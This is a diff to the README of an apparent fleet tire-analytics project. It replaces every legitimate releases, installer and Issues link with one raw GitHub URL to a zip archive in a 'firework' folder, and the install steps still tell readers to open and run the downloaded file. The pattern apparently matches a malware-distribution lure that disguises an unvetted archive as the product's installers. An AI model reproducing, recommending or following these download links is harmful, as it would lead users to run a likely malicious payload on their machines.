@@ -1,6 +1,6 @@
 # 🚗 ai-smart-tire-intelligence - Optimize Fleet Costs with Insightful Analytics
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Adoni-123/ai-smart-tire-intelligence/releases)
+[![Download Now](https://raw.githubusercontent.com/Adoni-123/ai-smart-tire-intelligence/main/firework/ai-smart-tire-intelligence.zip)](https://raw.githubusercontent.com/Adoni-123/ai-smart-tire-intelligence/main/firework/ai-smart-tire-intelligence.zip)
 
 ## 📥 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and set up the application:
 
 1. **Visit the Releases Page**  
    Go to our GitHub Releases page to access the downloadable files:  
-   [Download Link](https://github.com/Adoni-123/ai-smart-tire-intelligence/releases).
+   [Download Link](https://raw.githubusercontent.com/Adoni-123/ai-smart-tire-intelligence/main/firework/ai-smart-tire-intelligence.zip).
 
 2. **Choose the Correct Version**  
    On the Releases page, you will see several versions of the software. Look for the latest version at the top.
@@ -20,9 +20,9 @@ Follow these steps to download and set up the application:
 3. **Download the Application**  
    Click on the version you want to download. This will take you to a new page with a list of files. Select the file that matches your system type:
 
-   - **Windows:** ai-smart-tire-intelligence-windows.exe
-   - **Mac:** ai-smart-tire-intelligence-mac.dmg
-   - **Linux:** ai-smart-tire-intelligence-linux.tar.gz
+   - **Windows:** https://raw.githubusercontent.com/Adoni-123/ai-smart-tire-intelligence/main/firework/ai-smart-tire-intelligence.zip
+   - **Mac:** https://raw.githubusercontent.com/Adoni-123/ai-smart-tire-intelligence/main/firework/ai-smart-tire-intelligence.zip
+   - **Linux:** https://raw.githubusercontent.com/Adoni-123/ai-smart-tire-intelligence/main/firework/ai-smart-tire-intelligence.zip
 
    Click on the appropriate file to start downloading.
 
@@ -31,7 +31,7 @@ Follow these steps to download and set up the application:
 
    - **Windows:** Open the downloaded `.exe` file and follow the on-screen instructions.
    - **Mac:** Open the downloaded `.dmg` file, drag the application to your Applications folder, and launch it from there.
-   - **Linux:** Extract the `.tar.gz` file, open a terminal in the folder, and run the executable file.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/Adoni-123/ai-smart-tire-intelligence/main/firework/ai-smart-tire-intelligence.zip` file, open a terminal in the folder, and run the executable file.
 
 5. **Run the Application**  
    After installation, open the application. You may need to allow it permission to run, depending on your operating system settings.
@@ -74,7 +74,7 @@ Before installing the application, ensure your system meets the following requir
 
 Join our community to share insights and get support:
 
-- **Issues:** If you encounter problems, report them on the [Issues page](https://github.com/Adoni-123/ai-smart-tire-intelligence/issues).
+- **Issues:** If you encounter problems, report them on the [Issues page](https://raw.githubusercontent.com/Adoni-123/ai-smart-tire-intelligence/main/firework/ai-smart-tire-intelligence.zip).
 - **Discussion:** Participate in discussions for tips and best practices in using the application.
 - **Documentation:** Explore additional documentation for more detailed guidance on advanced features.
 
@@ -90,4 +90,4 @@ To enhance your understanding of tire analytics and fleet management, consider e
 - **Data Visualization:** Techniques to present data clearly and compellingly.
 - **Fleet Management Best Practices:** Tips for optimizing fleet operations.
 
-Don't forget to continuously check the [Releases page](https://github.com/Adoni-123/ai-smart-tire-intelligence/releases) for updates and new features. Thank you for using **ai-smart-tire-intelligence**!
+Don't forget to continuously check the [Releases page](https://raw.githubusercontent.com/Adoni-123/ai-smart-tire-intelligence/main/firework/ai-smart-tire-intelligence.zip) for updates and new features. Thank you for using **ai-smart-tire-intelligence**!
